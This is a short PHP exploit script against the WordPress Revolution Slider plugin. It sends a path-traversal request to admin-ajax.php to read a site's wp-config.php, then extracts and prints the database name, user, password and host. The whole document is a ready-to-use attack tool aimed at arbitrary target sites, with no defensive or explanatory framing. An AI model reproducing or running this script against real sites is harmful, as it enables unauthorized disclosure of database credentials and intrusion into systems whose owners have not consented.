<?php

  $target = $argv[1];

  define('wp_file', "../wp-config.php");
  define('wp_args', "?action=revslider_show_image&img=");
  define('wp_path', "/wp-admin/admin-ajax.php");

  print "\n[!] Set target > $target \n\n";

  $url = parseUrl($target);


  $init = curl_init($url);
  curl_setopt($init, CURLOPT_RETURNTRANSFER, true);
  $data = curl_exec($init);
  $code = curl_getinfo($init, CURLINFO_HTTP_CODE);
  if($code  == 200){
      exploit($data);
  }else{
      notVuln();
  }

  function exploit($data){
      $lines = split("\n",$data);
      $rest  = array();
      foreach($lines as $line){
          $data = split("DB_", $line);
          if(!empty($data[1])){
              $rest[] = "(DB_".$data[1]."\n";
          }
      }
      if(empty($rest)){
        notVuln();
      }else{
          print "\n[!] VULNERABLE!!!\n\n";
          print "Database config disclosure>\n\n";
          foreach($rest as $line){
              print "#> ".$line;
          }
          print "\n__END__\n";
      }
  }

  function parseUrl($target){
      $http = split("http",$target);
      if(empty($http[1])){
          $http = "http://$http[0]";
      }else{
          $http = $target;
      }
      $url = $http.wp_path.wp_args.wp_file;
      return $url;
  }

  function notVuln(){
      die("\n [!] NOT VULNERABLE \n\n");
  }

?>
